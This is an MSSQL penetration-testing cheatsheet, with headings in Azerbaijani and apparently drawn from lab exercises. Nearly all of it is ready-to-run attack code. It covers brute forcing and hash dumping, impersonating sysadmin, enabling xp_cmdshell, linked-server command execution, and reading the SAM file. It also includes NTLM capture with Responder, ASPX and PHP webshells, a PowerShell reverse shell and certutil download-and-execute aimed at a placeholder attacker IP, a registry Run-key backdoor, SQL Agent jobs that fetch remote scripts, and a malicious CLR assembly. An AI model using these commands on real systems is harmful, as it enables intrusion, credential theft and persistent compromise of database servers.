# MSSQL Penetration Testing Cheatsheet

---

## 1. Qoşulma (Connection)

### Windows / PowerShell
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" `
  -username "inlanefreight\damundsen" `
  -password "SQL1234!" `
  -query 'Select @@version'
```

### Linux (Impacket)
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  fiona@10.129.203.10 -windows-auth

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
  inlanefreight/fiona@10.129.203.10 -windows-auth

impacket-mssqlclient domain/user:password@10.0.0.5
```

### sqlcmd
```bash
sqlcmd -S SERVERNAME -E                      # Windows auth
sqlcmd -S tcp:10.0.0.5,1433 -E
sqlcmd -S SERVER -U username -P password     # SQL auth
sqlcmd -S 10.0.0.5 -U sa -P password
```

### Digər üsullar
```bash
mssql-cli -S 10.0.0.5 -U sa -P password
nc -nv 10.0.0.5 1433
```

---

## 2. Nmap Skan

```bash
# Versiya aşkarlanması
nmap -p 1433 --script ms-sql-info <target>

# Tam enumeration
nmap -p 1433 --script ms-sql-* <target>

# İstifadəçi & boş şifrə yoxlaması
nmap -p 1433 --script ms-sql-hasdbaccess,ms-sql-empty-password <target>

# Verilənlər bazası / cədvəl siyahısı
nmap -p 1433 --script ms-sql-databases,ms-sql-tables <target>

# Brute force
nmap -p 1433 --script ms-sql-brute \
  --script-args mssqluserdb=users.txt,mssqlpassdb=pass.txt <target>

# xp_cmdshell yoxlaması
nmap -p 1433 --script ms-sql-xp-cmdshell <target>

# Hash dump (credential ilə)
nmap -p 1433 --script ms-sql-dump-hashes \
  --script-args mssqlusername='sa',mssqlpassword='pass' <target>

# Konfiqurasiya backup
nmap -p 1433 --script ms-sql-config <target> \
  --script-args mssqlusername='sa',mssqlpassword='pass'
```

---

## 3. Əsas Enumeration

```sql
-- Verilənlər bazası siyahısı
SELECT name FROM sys.databases;
USE <dbname>;
SELECT name FROM sys.tables;

-- Cari kontekst
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin'), @@version;

-- Sysadmin yoxlaması
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Login-lər və rollar
SELECT name FROM sys.sql_logins;
SELECT name FROM sys.database_principals;
SELECT name FROM sys.server_principals;

-- Servis hesabları
SELECT servicename, service_account FROM sys.dm_server_services;

-- TRUSTWORTHY verilənlər bazaları
-- (TRUSTWORTHY ON olduqda DB içindəki kod server səviyyəsində etibar edilir)
SELECT name, is_trustworthy_on FROM sys.databases;

-- DB owner tapmaq
SELECT name, SUSER_SNAME(owner_sid) FROM sys.databases;

-- Linked server siyahısı
SELECT srvname, isremote FROM sysservers;
```

---

## 4. İmpersonation (Başqa İstifadəçi Adından İstifadə)

```sql
-- IMPERSONATE icazəsi olan loginləri tapmaq
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- DB səviyyəsindəki rol üzvlüyü
SELECT * FROM sys.database_role_members;

-- Server səviyyəsindəki IMPERSONATE icazələri
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- İstifadəçi kimi davranmaq
EXECUTE AS LOGIN = 'john';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;

-- sysadmin kimi davranmaq
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
REVERT;

-- Kömək
EXEC sp_helpuser;
```

---

## 5. xp_cmdshell — Komanda İcra

```sql
-- Aktivləşdirmək
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- İstifadə
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_readerrorlog;

-- Deaktiv etmək
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

---

## 6. Linked Server İstismarı

```sql
-- Linked server siyahısı
SELECT srvname, isremote FROM sysservers;

-- Linked serverdə sorğu icra etmək
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')')
AT [LOCAL.TEST.LINKED.SRV];

-- Linked server üzərindən xp_cmdshell aktivləşdirmək
EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];

-- Alternativ sintaksis
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')')
AT [10.0.0.12\SQLEXPRESS];
```

---

## 7. Fayl Oxuma (File Read)

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS x;
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
```

---

## 8. NTLM Hash Ələ Keçirmə (xp_dirtree + Responder)

```bash
# Attack machine-da SMB dinləyicisi başlatmaq
responder -I tun0
```

```sql
-- SMB SMB hash trigger — xp_dirtree
EXEC master..xp_dirtree '\\10.10.15.53\shared\';

-- Alternativ — xp_fileexist
EXEC xp_fileexist '\\YOUR_IP\share\test.txt';

-- Çoxlu trigger (10 dəfə)
DECLARE @i INT = 0;
WHILE @i < 10 BEGIN
  EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
  SET @i = @i + 1;
END;
```

```bash
# Hash crack
hashcat -a 0 -m 5600 hash wordlist
```

---

## 9. OLE Automation — Webshell & RCE

### Aktivləşdirmək
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures'; -- Verify
```

### ASPX Webshell
```sql
DECLARE @obj INT, @fso INT, @file INT, @hr INT;
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT;
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT,
  'C:\inetpub\wwwroot\shell.aspx', 2;
EXEC @hr = sp_OAMethod @file, 'Write', NULL,
  '<%@ Page Language="C#" %><% Process proc = new Process();
   proc.StartInfo.FileName = Request["cmd"];
   proc.StartInfo.Arguments = "/c " + Request["c"];
   proc.StartInfo.UseShellExecute = false;
   proc.StartInfo.RedirectStandardOutput = true;
   proc.Start();
   Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
   proc.WaitForExit(); %>';
EXEC @hr = sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @obj;
```

### PHP Webshell
```sql
DECLARE @obj INT, @file INT, @hr INT;
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT;
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT,
  'C:\inetpub\wwwroot\cmd.php', 2;
EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<?php echo shell_exec($_GET["c"]); ?>';
EXEC @hr = sp_OAMethod @file, 'Close';
EXEC sp_OADestroy @file;
EXEC sp_OADestroy @obj;
```

### PowerShell Reverse Shell (diska yazaraq)
```sql
DECLARE @obj INT, @com INT, @file INT, @hr INT, @src NVARCHAR(1000);
SET @src = N'$client = new-object System.Net.Sockets.TCPClient("YOUR_IP",4444);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT;
EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\rev.ps1', 2;
EXEC @hr = sp_OAMethod @file, 'Write', NULL, @src;
EXEC @hr = sp_OAMethod @file, 'Close';
EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT;
EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'powershell.exe -ep bypass -f C:\Windows\Temp\rev.ps1';
EXEC sp_OADestroy @com;
```

### Download & Execute
```sql
DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'WScript.Shell', @obj OUT;
EXEC @hr = sp_OAMethod @obj, 'Run', NULL,
  'certutil.exe -urlcache -split -f http://YOUR_IP/payload.exe C:\Windows\Temp\payload.exe
   && C:\Windows\Temp\payload.exe';
EXEC sp_OADestroy @obj;
```

### Registry Persistence
```sql
DECLARE @obj INT, @hr INT;
EXEC @hr = sp_OACreate 'WScript.Shell', @obj OUT;
EXEC @hr = sp_OAMethod @obj, 'RegWrite', NULL,
  'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor',
  'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/backdoor.ps1'')"';
EXEC sp_OADestroy @obj;
```

---

## 10. SQL Agent Job — RCE

### PowerShell Job (disksiz)
```sql
EXEC msdb.dbo.sp_add_job @job_name = N'hacker', @enabled = 1;
EXEC msdb.dbo.sp_add_jobstep
  @job_name = N'hacker',
  @step_name = N'ps1',
  @subsystem = N'PowerShell',
  @command = N'IEX (New-Object Net.WebClient).DownloadString("http://YOUR_IP/shell.ps1")';
EXEC msdb.dbo.sp_start_job N'hacker';
EXEC msdb.dbo.sp_delete_job @job_name = N'hacker';
```

### CMD Job (xp_cmdshell olmadan)
```sql
EXEC msdb.dbo.sp_add_jobstep
  @job_name = N'hacker',
  @step_name = N'cmd',
  @subsystem = N'CMDEXEC',
  @command = N'powershell -nop -w hidden -c
    "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/shell.ps1'')"';
```

### Agent Enumeration
```sql
SELECT name, is_enabled, current_mode FROM msdb.dbo.sysjobservers;
SELECT name, enabled FROM msdb.dbo.sysjobs;
```

---

## 11. CLR Assembly — RCE (xp_cmdshell bloklandıqda)

```sql
-- CLR aktivləşdirmək
ALTER DATABASE [database_name] SET TRUSTWORTHY ON;
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

-- DLL-i yükləmək və funksiya yaratmaq
CREATE ASSEMBLY EvilCLR FROM 'C:\temp\EvilCLR.dll' WITH PERMISSION_SET = UNSAFE;
CREATE FUNCTION dbo.ExecCmd(@cmd NVARCHAR(4000))
  RETURNS INT AS EXTERNAL NAME EvilCLR.StoredProcedures.ExecCmd;

-- İstifadə
SELECT dbo.ExecCmd('powershell IEX(New-Object Net.WebClient).DownloadString("http://IP/shell.ps1")');

-- Təmizlik
DROP FUNCTION dbo.ExecCmd;
DROP ASSEMBLY EvilCLR;
```

---

## 12. Dinləyicilər (Listeners)

```bash
nc -lvnp 4444
python3 -m http.server 80
curl "http://target/shell.aspx?cmd=whoami&c=dir"
```

---

## 13. mssqlclient.py Tez İstifadə

```bash
# SQL Agent RCE
python3 mssqlclient.py sa:pass@target -query \
  "EXEC msdb.dbo.sp_add_job @job_name=N'h',@enabled=1;
   EXEC msdb.dbo.sp_add_jobstep @job_name=N'h',@step_name=N'x',
     @subsystem=N'PowerShell',
     @command=N'IEX(New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\")';
   EXEC msdb.dbo.sp_start_job N'h'"

# OLE Webshell
python3 mssqlclient.py sa:pass@target -query \
  "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
   DECLARE @obj INT;
   EXEC sp_OACreate 'Scripting.FileSystemObject',@obj OUT;
   EXEC sp_OAMethod @obj,'CreateTextFile',NULL,'C:\\inetpub\\wwwroot\\shell.aspx',2;
   EXEC sp_OADestroy @obj"
```
